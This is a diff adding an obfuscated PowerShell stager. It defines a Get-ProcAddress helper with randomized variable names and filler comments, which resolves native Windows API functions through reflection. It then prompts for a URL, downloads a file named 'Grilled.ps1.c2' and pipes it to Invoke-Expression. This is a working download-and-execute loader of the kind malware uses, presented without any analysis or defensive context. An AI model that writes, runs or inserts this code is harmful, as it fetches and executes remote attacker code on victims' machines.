@@ -1,0 +1,24 @@
+function Get-ProcAddress {
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)] [String] $vyeetmDMQSQUYcaSPBwHhnunWgeeG,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $CQWAQbAGkrfaRBLrmnyVKgnAKomZMSbYlvRYW
+    )
+
+    # Microsoft".
+    $zRhrYOERWCKeloAawJJHbOzZWmwc = [AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $LEhmuJgLUhBpyyRunaXOyamBTGN = $zRhrYOERWCKeloAawJJHbOzZWmwc.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    # Microsoft".
+    $QUbBuosaVOUkPbekAzpMufPiwqpdgYFkfKSa = $LEhmuJgLUhBpyyRunaXOyamBTGN.GetMethod('GetModuleHandle')
+    $hqXIYzZYxOqTyPXpwIJlPFaFuSeyjn = $LEhmuJgLUhBpyyRunaXOyamBTGN.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    # Microsoft".
+    $NgNFJiWhLVANzBNUqNgogwmGECQar = $QUbBuosaVOUkPbekAzpMufPiwqpdgYFkfKSa.Invoke($null, @($vyeetmDMQSQUYcaSPBwHhnunWgeeG))
+    $pzLSiFkoorqFFeHrxfCRHdvgBVOwWgtpawoVhQCuRGvAc = New-Object IntPtr
+    $irgOaIYxllzQOiypUzVwPFiWRwvpcphZRmDPZTj = New-Object System.Runtime.InteropServices.HandleRef($pzLSiFkoorqFFeHrxfCRHdvgBVOwWgtpawoVhQCuRGvAc, $NgNFJiWhLVANzBNUqNgogwmGECQar)
+    # Microsoft".
+    return $hqXIYzZYxOqTyPXpwIJlPFaFuSeyjn.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$irgOaIYxllzQOiypUzVwPFiWRwvpcphZRmDPZTj, $CQWAQbAGkrfaRBLrmnyVKgnAKomZMSbYlvRYW))
+}
+[string]::IsNullOrEmpty($prefixpath) -and ($prefixpath = Read-Host "Specify prefixpathUrl")
+$wbc = New-Object System.Net.WebClient
+$wbc.Encoding = [System.Text.Encoding]::UTF8
+$wbc.DownloadString("$prefixpath/Grilled.ps1.c2") | iex
